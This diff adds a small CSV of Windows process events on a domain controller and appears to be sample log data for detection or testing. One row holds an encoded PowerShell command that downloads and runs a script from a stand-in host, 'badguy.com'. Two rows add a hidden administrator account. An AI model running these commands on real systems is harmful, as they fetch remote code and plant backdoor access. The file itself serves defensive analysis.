@@ -1,0 +1,5 @@
+_time,host,user,process_name,command_line,parent_process,severity
+2026-06-10T12:04:15Z,win-dc-01,admin,whoami.exe,whoami /all,cmd.exe,low
+2026-06-10T12:05:00Z,win-dc-01,admin,powershell.exe,"powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAZwB1AHkALgBjAG8AbQAvAHAAeQAuAHAAcwAxACcAKQA=",cmd.exe,high
+2026-06-10T12:06:20Z,win-dc-01,admin,net.exe,net user backup_admin /add,powershell.exe,high
+2026-06-10T12:06:40Z,win-dc-01,admin,net.exe,net localgroup administrators backup_admin /add,powershell.exe,high
